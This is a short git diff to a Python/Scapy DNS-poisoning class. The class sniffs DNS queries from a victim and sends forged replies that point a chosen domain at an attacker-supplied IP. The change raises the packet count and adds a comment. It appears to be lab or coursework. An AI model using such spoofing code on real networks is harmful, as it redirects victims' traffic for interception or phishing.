@@ -13,6 +13,7 @@ class DnsPoisoning:
             # check if the packet (is a DNS packet) AND (comes from the target)
             if pkt.haslayer(DNS) and ((ipVictim is None) or (pkt[IP].src == ipVictim)):
                 # check if the dns packet (is a request) AND (concerns the target URL)
+                # EL PROBLEMO: decoding of the URL
                 if (pkt[DNS].qr == 0) and ((url is None) or (pkt[DNS].qd.qname.decode('UTF-8') == url)):
                     # for a response revert destination and source
                     fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
@@ -27,9 +28,9 @@ class DnsPoisoning:
                     send(poisonPacket, verbose=0, iface=interface)
                     print("Fake packet sent")
 
-        sniff(count=10,  # capture 1 packet
+        sniff(count=30,  # capture 1 packet
             store=0,  # do not store it
             prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
             iface=self.interface)
-        
+
         print("You are poisoned")
